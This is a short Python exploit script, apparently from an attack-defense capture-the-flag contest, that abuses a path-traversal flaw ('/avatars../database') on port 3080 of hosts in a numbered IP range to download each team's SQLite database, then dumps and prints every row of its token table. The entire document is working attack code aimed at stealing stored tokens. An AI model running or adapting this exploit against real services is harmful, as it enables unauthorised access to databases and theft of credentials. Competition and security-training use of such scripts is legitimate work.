import requests
import sqlite3


def sploit(team_id):
    database = requests.get(f'http://144.76.26.{team_id}:3080/avatars../database')
    with open('database', 'wb') as f:
        f.write(database.content)

    conn = sqlite3.connect('database')
    c = conn.cursor()

    response = c.execute('SELECT * FROM token')
    print(response.fetchall())